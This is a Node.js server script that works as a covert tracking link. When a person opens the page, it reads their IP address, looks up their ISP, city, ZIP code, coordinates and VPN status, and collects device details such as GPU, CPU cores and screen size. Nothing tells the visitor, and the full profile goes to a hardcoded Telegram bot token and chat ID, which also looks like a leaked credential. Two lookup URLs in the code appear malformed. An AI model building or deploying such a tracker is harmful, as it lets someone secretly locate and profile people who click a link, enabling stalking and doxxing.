const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

let logCache = {};

function sendTelegramMessage(text) {
    const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" });
    const options = {
        hostname: 'api.telegram.org', port: 443, path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, () => {});
    req.write(data); req.end();
}

// Queries clean public geolocation maps with an explicit fallback error catcher
function queryNetworkDetails(ip, callback) {
    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.')) {
        return callback({
            status: "success", city: "Local Dev Machine", regionName: "Local System",
            country: "Local Host Environment", isp: "Internal Loopback Route", mobile: false, proxy: false
        });
    }

    // Requests full detailed tracking layout fields from the network infrastructure database
    const endpoint = `https://ip-api.com{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,mobile,proxy`;
    
    https.get(endpoint, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                callback(JSON.parse(data));
            } catch (e) { callback(null); }
        });
    }).on('error', () => callback(null));
}

const server = http.createServer((req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    
    // Drop junk robot pings and background web browser icons right away
    if (userAgent.toLowerCase().includes('uptimerobot') || req.url === '/favicon.ico') {
        res.writeHead(200, { 'Content-Type': 'image/x-icon' }); res.end(); return;
    }

    // CRITICAL FIX: Explicitly extract the public IP passing through Render's load balancer
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const cleanIp = rawIp.split(',')[0].trim(); // Pull the true left-most origin parameter address

    if (req.method === 'GET' && req.url === '/') {
        const timestamp = new Date().toLocaleString();
        
        let deviceModel = "Desktop Computer / Laptop";
        if (/iPhone/i.test(userAgent)) deviceModel = "Apple iPhone";
        else if (/iPad/i.test(userAgent)) deviceModel = "Apple iPad";
        else if (/Android/i.test(userAgent)) {
            const match = userAgent.match(/Android\s+[^;]+;\s+([^)]+)/);
            deviceModel = match ? `Android Device (${match[1]})` : "Android Phone";
        } else if (/Macintosh/i.test(userAgent)) deviceModel = "Apple Mac Computer";

        queryNetworkDetails(cleanIp, (net) => {
            // Set up memory profile container layer
            logCache[cleanIp] = {
                timestamp, deviceModel, ip: cleanIp,
                isp: net && net.status === 'success' ? net.isp : "Unknown / Private Carrier Network",
                city: net && net.status === 'success' ? net.city : "Unknown City Location",
                region: net && net.status === 'success' ? net.regionName : "Unknown Region",
                country: net && net.status === 'success' ? net.country : "Unknown Country",
                zip: net && net.status === 'success' ? net.zip : "N/A",
                networkType: net && net.mobile ? "📶 Mobile Cellular Data (3G/4G/5G)" : "🌐 Fixed Broadband / Wi-Fi Network",
                proxyAlert: net && net.proxy ? "⚠️ VPN or Privacy Proxy Active" : "🔒 Direct Clean Line Connection",
                map: net && net.lat ? `https://google.com{net.lat},${net.lon}` : null,
                sent: false
            };

            // Safety timeout: Send whatever data we have if browser specs fail to sync up
            setTimeout(() => {
                if (logCache[cleanIp] && !logCache[cleanIp].sent) {
                    compileAndSendReport(cleanIp, null);
                }
            }, 1200);
        });

        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content);
        });
    } 
    else if (req.method === 'POST' && req.url === '/specs-sync') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                compileAndSendReport(cleanIp, JSON.parse(body));
            } catch (e) { compileAndSendReport(cleanIp, null); }
            res.writeHead(200); res.end();
        });
    }
});

function compileAndSendReport(ip, specs) {
    const info = logCache[ip];
    if (!info || info.sent) return;
    info.sent = true; // LOCK OUT REPETITIVE ALERTS IMMEDIATELY

    const screenString = specs ? `${specs.width}x${specs.height} (@${specs.ratio}x)` : "Hardware Restricted";
    const gpuString = specs ? specs.gpu : "Hardware Restricted";
    const cpuString = specs ? `${specs.cores} Core Engine` : "Hardware Restricted";
    const langString = specs ? specs.lang : "Hardware Restricted";
    const zoneString = specs ? specs.zone : "Hardware Restricted";

    let locationMapBlock = info.map ? `\n🗺️ [Open Google Maps Estimated ISP Hub Area](${info.map})` : "";

    // Assemble the clean, comprehensive single message card
    const finalReport = `📁 *Link Connection Profile Created*\n\n` +
                       `📶 *Public External IP:* \`${info.ip}\`\n` +
                       `🏢 *Network Operator (ISP):* ${info.isp}\n` +
                       `📡 *Connection Framework:* ${info.networkType}\n` +
                       `🛡️ *Network Shield Verification:* ${info.proxyAlert}\n` +
                       `🌍 *Estimated Location:* ${info.city}, ${info.region}, ${info.country} (${info.zip})\n\n` +
                       `📱 *Hardware Base Type:* ${info.deviceModel}\n` +
                       `⚙️ *Internal CPU Cores:* ${cpuString}\n` +
                       `🎮 *Graphics Framework (GPU):* \`${gpuString}\`\n` +
                       `🖥️ *Screen Aspect Layout:* ${screenString}\n` +
                       `🗣️ *System Local Language:* ${langString}\n` +
                       `⏰ *Device Time Zone Profile:* ${zoneString}\n\n` +
                       `⏱️ *Time Stamp Registered:* ${info.timestamp}` +
                       locationMapBlock;

    sendTelegramMessage(finalReport);
    delete logCache[ip];
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {});
